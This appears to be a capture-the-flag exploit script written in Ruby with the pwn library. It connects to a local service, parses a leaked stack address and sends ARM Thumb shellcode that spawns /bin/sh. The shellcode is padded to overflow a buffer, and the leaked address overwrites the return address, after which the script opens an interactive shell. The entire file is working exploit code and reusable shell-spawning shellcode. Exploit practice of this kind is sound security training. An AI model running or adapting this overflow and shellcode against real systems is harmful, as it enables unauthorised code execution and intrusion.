#!/usr/bin/env ruby
# coding: ascii-8bit
require 'pwn'

host = 'localhost'
port = 33022
$z = Sock.new host, port
def z; $z; end
context.log_level = :debug
tmp = z.recvline
stack_address = tmp.match(/: (.+)\n/)[1].to_i(16)
payload = "\x01\x70\x8f\xe2\x17\xff\x2f\xe1\x04\xa7\x03\xcf\x52\x40\x07\xb4\x68\x46\x05\xb4\x69\x46\x0b\x27\x01\xdf\x01\x01\x2f\x62\x69\x6e\x2f\x2f\x73\x68".ljust(0x104, "A")
payload << p32(stack_address)
z.sendline payload

z.interact
